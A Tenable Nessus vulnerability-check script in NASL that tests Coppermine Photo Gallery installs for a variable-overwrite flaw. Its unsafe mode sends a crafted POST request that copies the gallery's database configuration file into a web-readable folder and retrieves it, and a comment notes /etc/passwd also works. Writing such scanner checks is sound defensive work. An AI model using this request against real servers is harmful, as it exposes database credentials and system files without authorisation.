#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(35765);
  script_version("$Revision: 1.11 $");

  script_bugtraq_id(33514);
  script_osvdb_id(51661);
  script_xref(name:"EDB-ID", value:"7909");
  script_xref(name:"Secunia", value:"33748");

  script_name(english:"Coppermine Photo Gallery keysToSkip Parameter Overwrite");
  script_summary(english:"Tries to overwrite img_dir variable");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
data modification vulnerability."  );
  script_set_attribute( attribute:"description",  value:
"The version of Coppermine Photo Gallery installed on the remote host
contains a flaw in the anti-register_globals protective code in
'include/init.inc.php'.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated, remote attacker can leverage this issue
using a specially crafted request to overwrite arbitrary variables and
thereby upload and execute files with arbitrary code or read the
contents of arbitrary files on the remote host, subject to the
privileges of the web server user id."  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://forum.coppermine-gallery.net/index.php/topic,57882.0.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Upgrade to Coppermine Photo Gallery 1.4.20 or later."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/03/04");
 script_cvs_date("$Date: 2015/09/24 21:08:38 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("coppermine_gallery_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/coppermine_photo_gallery"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Check if picEditor.php exists.
  url = string(dir, "/picEditor.php");

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # If so...
  if ('type="hidden" name="img_dir" value="' >< res[2])
  {
    # If safe checks are enabled...
    if (safe_checks())
    {
      # Try to exploit the issue to simply overwrite the 'img_dir' variable.
      img_dir = string(SCRIPT_NAME, "-", unixtime());
      url = string(url, "?img_dir=", img_dir);

      postdata = string(
        "keysToSkip=1&",
        "_GET=1&",
        "_REQUEST=1"
      );

      req = http_mk_post_req(
        port        : port,
        item        : url, 
        data        : postdata,
        add_headers : make_array(
          "Content-Type", "application/x-www-form-urlencoded"
        )
      );
      res = http_send_recv_req(port:port, req:req);
      if (isnull(res)) exit(0);

      # There's a problem if we were able to change it.
      if (string('type="hidden" name="img_dir" value="', img_dir, '"') >< res[2])
      {
        if (report_verbosity > 0)
        {
          req_str = http_mk_buffer_from_req(req:req);
          report = string(
            "\n",
            "Nessus was able to exploit the issue to change the value of the hidden\n",
            "'img_dir' parameter using the following request :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            req_str, "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
          security_warning(port:port, extra:report);
        }
        else security_warning(port);
      }
    }
    # Otherwise...
    else {
      # Try to exploit the issue to retrieve the app's database connection info.
      #
      # nb: an absolute path for img_dir (eg, "/etc/passwd") works fine too,
      #     provided you update the content check below.
      file = string("NESSUS-", unixtime(), ".txt");
      img_dir = "include/config.inc.php";
      url = string(
        url, "?",
        "img_dir=", img_dir, "&",
        "CURRENT_PIC[filename]=/", file
      );

      postdata = string(
        "save=1&",
        "keysToSkip=1&",
        "_GET=1&",
        "_REQUEST=1"
      );

      req = http_mk_post_req(
        port        : port,
        item        : url, 
        data        : postdata,
        add_headers : make_array(
          "Content-Type", "application/x-www-form-urlencoded"
        )
      );
      res = http_send_recv_req(port:port, req:req);
      if (isnull(res)) exit(0);

      url2 = string(dir, "/albums/", file);
      res2 = http_send_recv3(method:"GET", item:url2, port:port);
      if (isnull(res2)) exit(0);

      # There's a problem if we were able to retrieve the file.
      if ("$CONFIG['dbserver']" >< res2[2])
      {
        if (report_verbosity > 0)
        {
          req_str = http_mk_buffer_from_req(req:req);

          report = string(
            "\n",
            "Nessus was able to exploit the issue to retrieve the contents of\n",
            "Coppermine's database connection info, from '", img_dir, "',\n",
            "using the following POST request :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            req_str, "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            "\n",
            "and then browsing to the following URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url), "\n"
          );
          if (report_verbosity > 1)
          {
            report += string(
              "\n",
              "Here are its contents :\n",
              "\n",
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
              res2[2],
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
            );
          }
          security_warning(port:port, extra:report);
        }
        else security_warning(port);
      }
    }
  }
}
